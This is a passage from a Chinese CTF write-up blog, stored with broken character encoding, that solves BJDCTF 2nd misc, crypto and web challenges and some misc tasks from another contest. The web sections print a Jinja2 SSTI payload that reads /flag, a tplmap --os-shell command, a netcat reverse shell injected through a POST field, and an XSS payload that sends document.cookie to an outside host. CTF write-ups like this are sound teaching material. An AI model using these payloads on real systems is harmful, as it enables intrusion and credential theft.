class="string">"<span class="variable">$&#123;file&#125;</span>"</span>;</span><br><span class="line">  <span class="keyword">done</span>;</span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></div>

<p>pyè„šæœ¬æœ‰æ—¶é—´è¡¥ä¸€å“ˆ</p>
<p>æœ€åå¾—åˆ°flagï¼š<code>BJD{wow_you_can_rea11y_dance}</code></p>
<h3 id="Imagin-å¼€åœºæ›²"><a href="#Imagin-å¼€åœºæ›²" class="headerlink" title="Imagin - å¼€åœºæ›²"></a>Imagin - å¼€åœºæ›²</h3><p>æ€è·¯ï¼šç©mikutapï¼Œæ ¹æ®é”®ç›˜é”®ä½æ‰“å‡ºç›¸ä¼¼çš„æ‹å­ï¼Œç„¶åç§»ä½å¾—åˆ°å¯†ç </p>
<p>hintï¼š</p>
<blockquote>
<p>å¤§å†™<br>mikutap<br>å¼€åœºæ›²é‡å¤äº†ä¸¤é<br>flagäº¤ä¸€éçš„å°±è¡Œ<br>æ ¼å¼BJD{å­—æ¯+æ•°å­—}<br>æ•°å­—èŒƒå›´0-5</p>
</blockquote>
<p>ï¼ˆæ¨ªï¼Œåœˆç‚¹ï¼Œå®å¿ƒæ–¹å—ï¼‰x 2+ ï¼ˆå‰ï¼Œç©ºå¿ƒæ–¹å—ï¼Œå®å¿ƒæ•£å¸ƒåœ†ï¼Œç©ºå¿ƒæ•£å¸ƒåœ†ï¼Œå®å¿ƒæ–¹å—ï¼Œç©ºå¿ƒå¤šè¾¹å½¢ï¼Œå®å¿ƒå¤šè¾¹å½¢ï¼‰x 2+  ï¼ˆä¸­å¿ƒå‡ºå‘åœ†ï¼Œä¸­å¿ƒå‡ºå‘åœ†ï¼Œç©ºå¿ƒå¤šè¾¹å½¢ï¼Œä¸­å¿ƒå‡ºå‘åœ†ï¼‰x 2 </p>
<p>å¬å°±å®Œäº‹äº†â€¦..æœ€åå¾—åˆ°flagï¼š<code>BJD{MIKUTAP3313313}</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>åšçš„å…¨æ˜¯1åˆ†çš„å—·ï¼Œèœé¸¡ä¸æ„¿å»æ‰¾RSAè„šæœ¬äº†</p>
<h3 id="ç­¾åˆ°-y1ng"><a href="#ç­¾åˆ°-y1ng" class="headerlink" title="ç­¾åˆ°-y1ng"></a>ç­¾åˆ°-y1ng</h3><p>QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==</p>
<p>base64è§£ç å¾—åˆ°flagï¼š<code>BJD{W3lc0me_T0_BJDCTF}</code></p>
<h3 id="è€æ–‡ç›²äº†"><a href="#è€æ–‡ç›²äº†" class="headerlink" title="è€æ–‡ç›²äº†"></a>è€æ–‡ç›²äº†</h3><p>è¿™é¢˜ç»™çˆ·æ•´ç¬‘äº†ï¼Œç™¾åº¦ç¿»è¯‘è¯»ä¸€ä¸‹</p>
<p>å»æ‰BJD{}å¯¹åº”çš„å­—ï¼Œå¾—åˆ°flagï¼š<code>BJD{æ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µ}</code></p>
<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/13.gif" src="/img/loading.gif" class="lazyload"></a>

<p>æ‹¿ğŸ™çš„æ˜¯0ï¼Œæ‹¿ğŸ—çš„æ˜¯1ï¼Œç¿»è¯‘ä¸€ä¸‹ï¼ŒäºŒè¿›åˆ¶è½¬ASCII</p>
<p>å¾—åˆ°flagï¼š<code>BJD{M!a0~}</code></p>
<h3 id="çµèƒ½ç²¾é€š-y1ng"><a href="#çµèƒ½ç²¾é€š-y1ng" class="headerlink" title="çµèƒ½ç²¾é€š-y1ng"></a>çµèƒ½ç²¾é€š-y1ng</h3><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/21/BJDCTF-2nd-wp/14.png" src="/img/loading.gif" class="lazyload"></a>

<p>åœ£å ‚æ­¦å£«å¯†ç ï¼Œç¿»è¯‘ä¸€å“ˆï¼Œflagï¼š<code>BJD{IMKNIGHTSTEMPLAR}</code></p>
<h3 id="ç‡•è¨€ç‡•è¯­"><a href="#ç‡•è¨€ç‡•è¯­" class="headerlink" title="ç‡•è¨€ç‡•è¯­"></a>ç‡•è¨€ç‡•è¯­</h3><p>16è¿›åˆ¶è½¬ASCII+ç»´å‰å°¼äºšå¯†ç </p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/16.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¾—åˆ°flagï¼š<code>bjd{yanzi_jiushige_shabi}</code></p>
<h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><p>æœ¬æ¥ä»¥ä¸ºè¿™é¢˜æ˜¯è¯é¢‘åˆ†æï¼Œç„¶åç›´æ¥ä¸Šè„šæœ¬ï¼Œè¿˜æŠŠå­—æ¯é¡ºåºå’Œæœ€å¸¸å‡ºç°å­—æ¯é¡ºåºå¯¹åº”äº†ä¸€ä¸‹ï¼Œç„¶å¹¶åµ</p>
<p>æœ€åæ”¶åˆ°ç¾¤é‡Œå¸ˆå‚…çš„å¯å‘ç”¨<a href="https://www.quipqiup.com" target="_blank" rel="noopener">quipquip</a>ï¼ˆè§£ä¸€äº›ç®€å•æ›¿æ¢å¯†ç ï¼Œå…¶ä¸­MIHæ˜æ˜¾å¯¹åº”BJD</p>
<p>hintä¸­æç¤ºéƒ½æ˜¯è‹±æ–‡å•è¯ï¼Œæ‰€ä»¥æŠŠyæ›¿æ¢æˆk</p>
<p>æœ€åå¾—åˆ°flagï¼š<code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>SSTIæ¨¡æ¿æ³¨å…¥ ï¼ˆjinjia2</p>
<p>éšæ„è¾“ä¸€ä¸ªæ•°å­—åœ¨ç½‘é¡µæºä»£ç å‡ºçœ‹åˆ°æç¤ºsssssstiï¼Œç„¶è€Œå¹¶ä¸ä¼šâ€¦..</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/17.png" src="/img/loading.gif" class="lazyload"></a>

<p>æ ¹æ®<a href="https://www.1p0ch.cn" target="_blank" rel="noopener">ç‹ç‰Œè¾…åŠ©æ¥ å­ç¥</a>ç»™çš„æç¤ºï¼ŒæœSSTIæ¨¡æ¿æ³¨å…¥ï¼Œå¤§æ¦‚çœ‹æ‡‚äº†ç‚¹ï¼Œè®²ä¹Ÿè®²ä¸å‡ºæ¥ï¼Œç›´æ¥æ”¾payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">markdown</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">177</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'open'</span>](<span class="link">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿˜æœ‰å‚è€ƒçš„<a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener">å¸ˆå‚…çš„åšå®¢</a></p>
<p>å¥½åƒè¿˜æœ‰ä¸€ç§<a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">tplmap</a>çš„è§£æ³•</p>
<blockquote>
<p>Tplmapæ˜¯ä¸€ä¸ªpythonå·¥å…·ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨æ²™ç®±è½¬ä¹‰æŠ€æœ¯æ‰¾åˆ°ä»£ç æ³¨å…¥å’ŒæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰æ¼æ´ã€‚è¯¥å·¥å…·èƒ½å¤Ÿåœ¨è®¸å¤šæ¨¡æ¿å¼•æ“ä¸­åˆ©ç”¨SSTIæ¥è®¿é—®ç›®æ ‡æ–‡ä»¶æˆ–æ“ä½œç³»ç»Ÿã€‚ä¸€äº›å—æ”¯æŒçš„æ¨¡æ¿å¼•æ“åŒ…æ‹¬PHPï¼ˆä»£ç è¯„ä¼°ï¼‰ï¼ŒRubyï¼ˆä»£ç è¯„ä¼°ï¼‰ï¼ŒJaveScriptï¼ˆä»£ç è¯„ä¼°ï¼‰ï¼ŒPythonï¼ˆä»£ç è¯„ä¼°ï¼‰ï¼ŒERBï¼ŒJinja2å’ŒTornadoã€‚è¯¥å·¥å…·å¯ä»¥æ‰§è¡Œå¯¹è¿™äº›æ¨¡æ¿å¼•æ“çš„ç›²æ³¨å…¥ï¼Œå¹¶å…·æœ‰æ‰§è¡Œè¿œç¨‹å‘½ä»¤çš„èƒ½åŠ›ã€‚</p>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./tplmap.py -u http://9df44046-64a1-4ab3-b167-6e2bca4fe272.node3.buuoj.cn/qaq?name= --os-shell</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/22.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>ç½‘ç«™æç¤ºï¼šPower By thinkphp5</p>
<p>éšä¾¿è¾“å…¥ä¸€ä¸ªså‚æ•°ï¼ŒæŠ¥é”™å¦‚ä¸‹</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/20.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¾—åˆ°tpç‰ˆæœ¬ï¼Œç½‘ä¸Šæœä¸€ä¸‹<a href="https://blog.csdn.net/qq_38807738/article/details/86777541" target="_blank" rel="noopener">5.0.23</a>çš„æ¼æ´ï¼Œå¯ä»¥ç›´æ¥ç”¨çš„ï¼Œå¾—åˆ°flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/21.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p>å¼€å§‹æ˜¯ä¸ªvimæ–‡ä»¶æ³„éœ²ï¼Œè€Œä¸”æ²¡èµ°å¯»å¸¸è·¯ï¼Œdirsearchä¹Ÿæ²¡æ‰«å‡ºæ¥</p>
<p>å¤‡ä»½æ–‡ä»¶åœ¨/.index.php.swpé‡Œï¼Œvim -r  æ¢å¤ä¸€ä¸‹</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/18.png" src="/img/loading.gif" class="lazyload"></a>

<p>èµ·åˆä»¥ä¸ºæ˜¯ä¸ªRCEï¼Œç»•å€’æ˜¯ä¸éš¾ï¼Œä½†æ˜¯å®ƒæ²¡å›æ˜¾ã€‚ã€‚</p>
<p>äºæ˜¯å°±å¼€å§‹äº†æˆ‘æ¼«é•¿çš„ï¼Œå¼¹shellä¹‹è·¯ã€‚è¯•è¿‡bashï¼Œpythonï¼Œcurlï¼Œperlï¼Œncâ€¦..</p>
<p>åº”è¯¥æ˜¯æˆ‘å§¿åŠ¿ä¸å¯¹ã€‚ã€‚åœ¨æ¯”èµ›ç»“æŸåYoshino-så¸ˆå‚…åœ¨ç¾¤é‡Œçš„ä¸€å¥<code>nc ip port -e sh</code>ç‚¹é†’äº†æˆ‘ã€‚ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯åå¼¹ä¸ªshellï¼Œåœ¨é‡Œé¢æ‰¾flagå°±å¥½äº†</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è‡ªå·±èµ·çš„basic linux labs</span></span><br><span class="line">ifconfig</span><br><span class="line">nc -lvp port</span><br><span class="line"><span class="comment">#postçš„æ•°æ®</span></span><br><span class="line">girl_friend=nc ip port -e sh</span><br></pre></td></tr></table></figure></div>

<p>æœ€ååœ¨<code>./etc/demo/P3rh4ps/love/you</code>ä¸­æ‰¾åˆ°flag</p>
<h3 id="å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h3><p>è¿™æ˜¯ä¸€é“è€ƒHTTPå¤´çš„é¢˜</p>
<p>åŒ…å«äº†ï¼šClient-ipã€Refererã€Fromã€Cookieã€UAè¿˜æœ‰Via</p>
<p>å…ˆéšä¾¿ç™»å½•åæŸ¥çœ‹æºä»£ç ï¼Œæç¤ºå­˜åœ¨L0g1n.phpï¼Œè¿›å»ä¹‹åå°±ä¸€å±‚å±‚ç»•å°±å®Œäº‹äº†</p>
<p>XFFè¢«banäº†ï¼Œå¯ä»¥æ„é€ Client-ip</p>
<p>UAè°·æ­Œä¸€ä¸‹å‘ç°æ˜¯å›½å¤–çš„ä¸€é“åŸé¢˜ï¼ŒåŒ…å«Commodore 64å°±å¥½</p>
<p>æœ€åå¡åˆ°Viaå¥½ä¹…ï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯Proxy-Authorizationè¦å»çˆ†ç ´ç”¨æˆ·ååŠ å¯†ç çš„base64ï¼Œå¤±è´¥äº†ã€‚</p>
<p>åæ¥çœ‹åˆ°ç¾¤é‡Œå¸ˆå‚…å‘çš„æˆªå›¾æ‰çŸ¥é“Via</p>
<blockquote>
<p>åˆ—å‡ºä»å®¢æˆ·ç«¯åˆ° OCS æˆ–è€…ç›¸åæ–¹å‘çš„å“åº”ç»è¿‡äº†å“ªäº›ä»£ç†æœåŠ¡å™¨ï¼Œä»–ä»¬ç”¨ä»€ä¹ˆåè®®ï¼ˆå’Œç‰ˆæœ¬ï¼‰å‘é€çš„è¯·æ±‚ã€‚å½“å®¢æˆ·ç«¯è¯·æ±‚åˆ°è¾¾ç¬¬ä¸€ä¸ªä»£ç†æœåŠ¡å™¨æ—¶ï¼Œè¯¥æœåŠ¡å™¨ä¼šåœ¨è‡ªå·±å‘å‡ºçš„è¯·æ±‚é‡Œé¢æ·»åŠ  Via å¤´éƒ¨ï¼Œå¹¶å¡«ä¸Šè‡ªå·±çš„ç›¸å…³ä¿¡æ¯ï¼Œå½“ä¸‹ä¸€ä¸ªä»£ç†æœåŠ¡å™¨ æ”¶åˆ°ç¬¬ä¸€ä¸ªä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚æ—¶ï¼Œä¼šåœ¨è‡ªå·±å‘å‡ºçš„è¯·æ±‚é‡Œé¢å¤åˆ¶å‰ä¸€ä¸ªä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚çš„Via å¤´éƒ¨ï¼Œå¹¶æŠŠè‡ªå·±çš„ç›¸å…³ä¿¡æ¯åŠ åˆ°åé¢ï¼Œ ä»¥æ­¤ç±»æ¨ï¼Œå½“ OCS æ”¶åˆ°æœ€åä¸€ä¸ªä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚æ—¶ï¼Œæ£€æŸ¥ Via å¤´éƒ¨ï¼Œå°±çŸ¥é“è¯¥è¯·æ±‚æ‰€ç»è¿‡çš„è·¯ç”±ã€‚</p>
</blockquote>
<p>å†å¼€ç¯å¢ƒåšäº†ä¸€éå¾—åˆ°flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/19.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="XSSä¹‹å…‰"><a href="#XSSä¹‹å…‰" class="headerlink" title="XSSä¹‹å…‰"></a>XSSä¹‹å…‰</h3><p>Gitæºç æ³„éœ²ï¼Œååºåˆ—åŒ–ï¼Œxss</p>
<p>å¼€å±€  gungungun  è€ç¥–å®‰äººäº†ï¼ŒæŸ¥çœ‹æºç å•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°Gitæ³„éœ²</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/23.png" src="/img/loading.gif" class="lazyload"></a>

<p>æç¤ºæœ‰xssæ¼æ´ï¼Œåˆ©ç”¨phpåŸç”Ÿç±»æ„é€ payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = serialize(<span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;window.location.href='http://b9c4633b-9ce6-4937-8b9f-a1b02de9a086.node3.buuoj.cn/'+document.cookie&lt;/script&gt;"</span>));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/24.png" src="/img/loading.gif" class="lazyload"></a>

<p>åœ¨cookieä¸­å¾—åˆ°urlç¼–ç çš„flagï¼Œè§£ç åå¾—åˆ°flag</p>
<p>&nbsp;</p>
<p>è¿™æ˜¯æ–°ç”Ÿèµ›ï¼Ÿï¼Ÿè®©æˆ‘æ·±åˆ»åœ°è®¤è¯†åˆ°è‡ªå·±è¿æ–°ç”Ÿéƒ½ä¸å¦‚äº†ã€‚ï¼ˆæˆ‘æ„Ÿè§‰BJD 1st ä¹Ÿä¸ç®€å•</p>
<p>æ…¢æ…¢æ¥å§ï¼Œè½¬è½¬å‹ï¼Œmiscæ˜¯å…´è¶£ï¼Œwebæ˜¯é¥­ç¢—ï¼ˆhhh</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Crypto</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>é«˜æ ¡æˆ˜&quot;ç–«&quot;-misc-wp</title>
    <url>/2020/03/09/xctf-misc-wp/</url>
    <content><![CDATA[<h3 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h3><p>è™½ç„¶è®¡ç½‘å’ŒOSä½œä¸šè¿˜æ²¡å†™ï¼Œä½†æ˜¯å¥ˆä½•ä¸æƒ³å†™å•Šã€‚ã€‚ã€‚äºæ˜¯å°±å†™ç¯‡åšå®¢ç©å§ã€‚ã€‚ã€‚ã€‚</p>
<p>ä¸Šå‘¨æœ«æœ‰ä¸€åœºé«˜æ ¡æˆ˜â€œç–«â€èµ›åœ¨adworldå¹³å°ä¸Šä¸¾è¡Œäº†ï¼Œä½œä¸ºè”ç›Ÿå­¦æ ¡çš„ä¸€å‘˜å½“ç„¶è¦å»æ°´ä¸€æ°´å•¦ã€‚</p>
<p>ä¸è¿‡æ°å·§æ¯”èµ›å‰ä¸€å¤©åšå®¢ç‚¸äº†ï¼Œæåˆ°åŠå¤œï¼Œç¬¬äºŒå¤©æ—©ä¸Šæ²¡èµ·æ¥ã€‚ã€‚</p>
<p>æ—©ä¸Šèµ·æ¥çš„æ—¶å€™å‘ç°ç­¾åˆ°é¢˜å’Œä¸€é“miscå·²ç»è¢«åšäº†ï¼Œä¼¤å¿ƒï¼ï¼ˆwebæ˜¯ä¸æ•¢æƒ³çš„ï¼Œä¹Ÿå°±æ°´æ°´miscã€‚ã€‚</p>
<h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><h4 id="ç®€å•misc"><a href="#ç®€å•misc" class="headerlink" title="ç®€å•misc"></a>ç®€å•misc</h4><p>æ€è·¯ï¼šæ–‡ä»¶å¤´ä¿®å¤+æ–‡ä»¶åˆ†ç¦»+æ‘©æ–¯å¯†ç +base64</p>
<p>ç”¨winhexæˆ–è€…010editoræˆ–è€…hxdæ‰“å¼€æ–‡ä»¶ï¼Œä¿®å¤æ–‡ä»¶å¤´ä¸ºFFD8</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/09/xctf-misc-wp/1.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæœä¸€ä¸‹æ–‡ä»¶å°¾FFD9ï¼Œå‘ç°åé¢æœ‰ä¸ªå‹ç¼©åŒ…</p>
<p>æ‰‹åŠ¨æå–ä¹Ÿè¡Œï¼Œbinwalkä¹Ÿè¡Œï¼Œforemostä¹Ÿè¡Œï¼ˆæœ€è¿‘çˆ±ä¸Šäº†æ‰‹æ’•ï¼Œå› ä¸ºä¸ç”¨å¾€linuxé‡Œæ”¾äº†</p>
<p>è§£å‹åå‘ç°ä¸€æ®µæ‘©æ–¯å¯†ç ï¼š<code>./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.</code> è§£å¯†ä¸€ä¸‹ï¼š<code>EPIDEMICSITUATIONOFUNIVERSITYWAR</code></p>
<p>è¿™ä¸ªå°±æ˜¯flagå‹ç¼©åŒ…çš„å¯†ç ï¼Œè§£å‹åå¾—åˆ°ä¸€ä¼ base64ï¼š<code>VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=</code>è§£ç ä¸€ä¸‹å¾—åˆ°flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Th1s_is_FlaG_you_aRE_rigHT</span><br></pre></td></tr></table></figure></div>

<p>&nbsp;</p>
<h4 id="éšè—çš„ä¿¡æ¯"><a href="#éšè—çš„ä¿¡æ¯" class="headerlink" title="éšè—çš„ä¿¡æ¯"></a>éšè—çš„ä¿¡æ¯</h4><p>åè‰²äºŒç»´ç è¡¥å…¨æ‰«ç +ä¼ªåŠ å¯†+é¢‘è°±å›¾(é«˜ç¾¤ã€ä½ç¾¤)ç”µè¯éŸ³åˆ†æ+base64åŠ å¯†</p>
<p>æŠŠäºŒç»´ç é‡Œé¢åè‰²ä¸€ä¸‹ï¼Œè¡¥ä¸Šä¸‰ä¸ªå®šä½ç‚¹</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>æ‰«å‡ºæ¥æ˜¯ï¼š<code>flag{this_is_also_not_flag} è§£å‹å¯†ç ä¸åœ¨è¿™é‡Œ0.0ï¼</code></p>
<p>å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œç„¶åè¿˜åœ¨äºŒç»´ç é‚£å¼ å›¾ç‰‡é‡Œå‘ç°äº†è¿™ä¸ª</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/09/xctf-misc-wp/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>åº”è¯¥æ˜¯æ‰¾å‡ºéšè—çš„ä¿¡æ¯åbase64åŠ å¯†ï¼ˆåé¢æ˜¯TOGETYOUFLAG</p>
<p>ç„¶åå°±æ˜¯é‚£ä¸ªçº¯æ•°å­—çš„å‹ç¼©åŒ…ï¼Œæˆ‘ä»1ä½çˆ†ç ´åˆ°10ä½åï¼Œæ„Ÿè§‰ä¸å¯¹åŠ²</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/09/xctf-misc-wp/4.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>å†é«˜ä½æ•°è·‘å®Œæ€•ä¸æ˜¯æ¯”èµ›éƒ½ç»“æŸäº†ï¼Œæ”¾è¿›010ä¸€çœ‹ï¼Œæ·¦ï¼Œä¼ªåŠ å¯†</p>
<p>è§£å¼€åå¾—åˆ°ä¸€ä¸ªéŸ³é¢‘ï¼Œæ”¾è¿›Audacityçœ‹ä¸€ä¸‹ï¼Œå‘ç°æ­£å·§æ˜¯å‰å‡ å¤©çœ‹çš„<a href="https://www.ichunqiu.com/course/61665" target="_blank" rel="noopener">è§†é¢‘</a>é‡Œçš„ï¼ˆæ‹¨å·éŸ³</p>
<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>æ‰‹è§£ä¸€ä¸‹</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/09/xctf-misc-wp/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¾—åˆ°ä¸€ä¸²æ•°å­—ï¼š<code>187485618521</code>ï¼Œbase64åŠ å¯†ä¸€ä¸‹å¾—åˆ°flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MTg3NDg1NjE4NTIx</span><br></pre></td></tr></table></figure></div>

<p>&nbsp;</p>
<h4 id="ez-mem-amp-usb"><a href="#ez-mem-amp-usb" class="headerlink" title="ez_mem&amp;usb"></a>ez_mem&amp;usb</h4><p>æµé‡åˆ†æ+å†…å­˜å–è¯+usb(é”®ç›˜)</p>
<p>è¿™é“é¢˜åœ¨æ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥ï¼ˆå½“æ—¶è¿˜æ²¡å’‹åšè¿‡å†…å­˜å–è¯ï¼‰ï¼Œçœ‹<a href="https://blog.xiafeng2333.top/" target="_blank" rel="noopener">å¤é£å¸ˆå‚…çš„åšå®¢</a>åˆå¤ç›˜äº†ä¸€é</p>
<p>åœ¨pacpæå–å‡ºä¸€ä¸ªå‹ç¼©åŒ…é‡Œé¢æœ‰data.vmemï¼ˆæˆ–è€…binwalkï¼Œforemostå•¥çš„</p>
<p>æ‰”è¿›kalié‡Œï¼Œå…ˆè¯†åˆ«ä¸€ä¸‹æ“ä½œç³»ç»Ÿ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem imageinfo</span><br></pre></td></tr></table></figure></div>

<p>å‘ç°æ˜¯32ä½çš„winxpï¼Œåˆ—ä¸€ä¸‹è¿›ç¨‹(pslistæ— æ³•æ˜¾ç¤ºéšè—/ç»ˆæ­¢è¿›ç¨‹ï¼Œå¯ä»¥ç”¨æ’ä»¶psscanè§£å†³</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 pslist</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/8.png" src="/img/loading.gif" class="lazyload"></a>

<p>å½“æ—¶å…³é”®è¿›ç¨‹æŠ“é”™äº†ã€‚ã€‚æ²¡åˆ†æIEï¼ˆä¸€ç”Ÿä¹‹æ•Œï¼‰ã€‚ã€‚ç›´æ¥å»æå–cmdå’Œconimeçš„è¿›ç¨‹ï¼Œç„¶åå»æ‰«flagå­—ç¬¦ä¸²</p>
